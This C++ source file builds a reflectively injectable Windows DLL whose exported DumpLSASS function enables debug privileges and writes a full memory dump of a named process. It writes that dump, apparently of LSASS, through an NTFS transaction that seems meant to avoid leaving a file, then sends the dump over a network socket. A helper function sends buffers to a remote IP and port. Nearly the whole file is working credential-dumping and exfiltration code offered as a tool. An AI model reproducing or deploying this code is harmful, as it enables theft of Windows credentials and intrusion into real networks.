//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include "ReflectiveLoader.h"

// ***************************************************************************************************
#include <shlwapi.h>
#include <Windows.h>
#include <Dbghelp.h>
#include <iostream>
#include <winnt.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <ktmw32.h>
#include <winsock2.h>
#include <string.h>
#include "Common.h"

#pragma comment (lib, "dbghelp") 
#pragma comment(lib, "KtmW32.lib")
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


// ***************************************************************************************************

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;
//===============================================================================================//
#define SIZE 200000000







int Send_via_sokcet(char* ip4, int port, LPVOID buffer, int size)
{
	WSADATA wsaData;
	SOCKET  SendingSocket;
	// Server/receiver address
	SOCKADDR_IN ServerAddr, ThisSenderInfo;
	// Server/receiver port to connect to
	int  RetCode;
	// Be careful with the array bound, provide some checking mechanism...
	int BytesSent, nlen;
	// Initialize Winsock version 2.2
	WSAStartup(MAKEWORD(2, 2), &wsaData);
	// Create a new socket to make a client connection.
	// AF_INET = 2, The Internet Protocol version 4 (IPv4) address family, TCP protocol
	SendingSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (SendingSocket == INVALID_SOCKET)
	{
		//std::cout << "Client: socket() failed! Error code: " << WSAGetLastError() << "\n";
		// Do the clean up
		WSACleanup();
		// Exit with error
		return -1;
	}
	//else
		//std::cout << "Client: socket() is OK!\n";
	// Set up a SOCKADDR_IN structure that will be used to connect
	// to a listening server on port 5150. For demonstration
	// purposes, let's assume our server's IP address is 127.0.0.1 or localhost
	// IPv4
	ServerAddr.sin_family = AF_INET;
	// Port no.
	ServerAddr.sin_port = htons(port);
	// The IP address
	ServerAddr.sin_addr.s_addr = inet_addr(ip4);
	// Make a connection to the server with socket SendingSocket.
	RetCode = connect(SendingSocket, (SOCKADDR *)&ServerAddr, sizeof(ServerAddr));
	if (RetCode != 0)
	{
		//std::cout << "Client: connect() failed! Error code: " << WSAGetLastError() << "\n";
		// Close the socket
		closesocket(SendingSocket);
		// Do the clean up
		WSACleanup();
		// Exit with error
		return -1;
	}
	/*else
	{
		//std::cout << "Client: connect() is OK, got connected...\n";
		std::cout << "Client: Ready for sending and/or receiving data...\n";
	}*/
	// At this point you can start sending or receiving data on
	// the socket SendingSocket.
	// Some info on the receiver side...
	BytesSent = send(SendingSocket, (char*)buffer, size, 0);
	if (BytesSent == SOCKET_ERROR)
		exit(0);
	else
	{
		//std::cout << "Client: send() is OK - bytes sent: " << BytesSent << "\n";
		// Some info on this sender side...
		// Allocate the required resources
		memset(&ThisSenderInfo, 0, sizeof(ThisSenderInfo));
		nlen = sizeof(ThisSenderInfo);
		getsockname(SendingSocket, (SOCKADDR *)&ThisSenderInfo, &nlen);
	}
	if (shutdown(SendingSocket, SD_SEND) != 0)
		//std::cout << "Client: Well, there is something wrong with the shutdown(). The error code :" << WSAGetLastError();
		exit(0);
	/*else
		std::cout << "Client: shutdown() looks OK...\n";*/
		// When you are finished sending and receiving data on socket SendingSocket,
		// you should close the socket using the closesocket API. We will
		// describe socket closure later in the chapter.
	if (closesocket(SendingSocket) != 0)
		//std::cout << "Client: Cannot close \"SendingSocket\" socket. Error code: " << WSAGetLastError();
		exit(0);
	else
		//std::cout << "Client: Closing \"SendingSocket\" socket...\n";
		exit(0);
	// When your application is finished handling the connection, call WSACleanup.
	if (WSACleanup() != 0)
		//std::cout << "Client: WSACleanup() failed!...\n";
		exit(0);
	/*else
		std::cout << "Client: WSACleanup() is OK...\n";*/
	return 0;
}


int Socketsend(SOCKET SendingSocket, LPVOID buffer, int size)
{
	return send(SendingSocket, (char*)buffer, size, 0);
}

BOOL EnableDebugPrivileges()
{
	HANDLE hCurrentProcess = GetCurrentProcess();
	HANDLE hProcessToken;
	LUID luID; 
	TOKEN_PRIVILEGES tpNewToken, tpPreviousToken;
	DWORD dwReturnLength;

	if (!hCurrentProcess)
	{
		PERROR("EnableDebugPrivileges(): GetCurrentProcess");
		return FALSE;
	}

	BOOL bRet = OpenProcessToken(hCurrentProcess, 40, &hProcessToken);
	if (!bRet)
	{
		PERROR("EnableDebugPrivileges(): OpenProcessToken\n");
		return FALSE;
	}

	bRet = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luID);

	if (!bRet)
	{
		PERROR("EnableDebugPrivileges(): LookupPrivilegeValue\n");
		return FALSE;
	}

	tpNewToken.PrivilegeCount = 1;
	tpNewToken.Privileges[0].Luid = luID;
	tpNewToken.Privileges[0].Attributes = 2;
	if (!AdjustTokenPrivileges(hProcessToken, FALSE, &tpNewToken, 28, &tpPreviousToken, &dwReturnLength))
	{
		PERROR("EnableDebugPrivileges(): AdjustTokenPrivileges\n");
		return FALSE;

	}
	return TRUE;
}

DWORD WriteFullDump(HANDLE hProc, HANDLE hFile)
{
	const DWORD Flags = MiniDumpWithFullMemory |
		MiniDumpWithFullMemoryInfo |
		MiniDumpWithHandleData |
		MiniDumpWithUnloadedModules |
		MiniDumpWithThreadInfo;

	bool Result = MiniDumpWriteDump(hProc,
		GetProcessId(hProc),
		hFile,
		(MINIDUMP_TYPE)Flags,
		NULL,
		NULL,
		NULL);

	if (!Result)
	{
		PERROR("MiniDumpWriteDump");
		return 0;
	}

	return 1;
}


DWORD FindProcessId(const char *processname)
{
	INFO("Search pid of %s\n", processname);

	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD dwResult = NULL;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcessSnap)
	{
		return 0;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);         
		PERROR("FindProcessId(): Process32First");
		return 0;
	}

	do
	{
		if (0 == strcmp(processname, pe32.szExeFile))
		{
			dwResult = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);

	if (dwResult == 0)
	{
		INFO("FindProcessId: Could not find pid of %s\n", processname);
		return 0;

	}
	
	INFO("Found process id: %s --> %d\n", processname, dwResult);
	return dwResult;
}

void validate_arguments(int argc, char **argv)
{
	// Validate the parameters
	if (argc != 4) {
		std::cout << "usage: " << argv[0] << "<server_address> <port> <process name> \n";
		exit(0);
	}
}

extern "C" __declspec(dllexport) int DumpLSASS(SOCKET sock, char* proc_name)
{

	HANDLE hProcess;
	DWORD dwPid;
	HANDLE hTransactionHandle, hTransactionFile = NULL;
	LPVOID lpMem = NULL;
	USHORT PUSHMINIVERSION = 0xFFFF;
	char pcFileName[150];
	DWORD bytesRead;

	if (!EnableDebugPrivileges())
	{
		exit(1);
	}

	dwPid = FindProcessId(proc_name);
	if (!dwPid)
	{
		exit(1);
	}

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, dwPid);
	if (INVALID_HANDLE_VALUE == hProcess)
	{
		PERROR("OpenProcess");
		exit(1);
	}

	if (!ExpandEnvironmentStrings("%temp%", (LPSTR)pcFileName, 150))
	{
		PERROR("ExpandEnvironmentStrings");
		exit(1);
	}
	strcat_s(pcFileName, 150, "\\trans_file");

	hTransactionHandle = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hTransactionHandle == INVALID_HANDLE_VALUE)
	{
		PERROR("CreateTransaction");
		exit(1);
	}

	hTransactionFile = CreateFileTransactedA(pcFileName, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransactionHandle, &PUSHMINIVERSION, NULL);
	if (INVALID_HANDLE_VALUE == hTransactionFile)
	{
		PERROR("CreateFileTransacted");
		exit(1);
	}

	if (!WriteFullDump(hProcess, hTransactionFile))
	{
		exit(1);
	}

	CloseHandle(hTransactionFile);

	hTransactionFile = CreateFileTransactedA(pcFileName, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransactionHandle, &PUSHMINIVERSION, NULL);
	if (INVALID_HANDLE_VALUE == hTransactionFile)
	{
		PERROR("CreateFileTransacted");
		exit(1);
	}

	lpMem = VirtualAlloc(NULL, SIZE, MEM_COMMIT, PAGE_READWRITE);
	if (!lpMem)
	{
		PERROR("VirtualAlloc");
		exit(1);
	}
	memset(lpMem, '\xcc', SIZE);

	ReadFile(hTransactionFile, lpMem, SIZE, &bytesRead, NULL);

	if (bytesRead == 0)
	{
		PERROR("ReadFile");
		exit(1);
	}

	CloseHandle(hTransactionHandle);
	CloseHandle(hTransactionFile);

	return Socketsend(sock, lpMem, bytesRead);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
		{
			*(HMODULE *)lpReserved = hAppInstance;
		}

		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;
		//MessageBoxA( NULL, "KAKA SHMAKA!", "KAKA SHMAKA", MB_OK );

		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}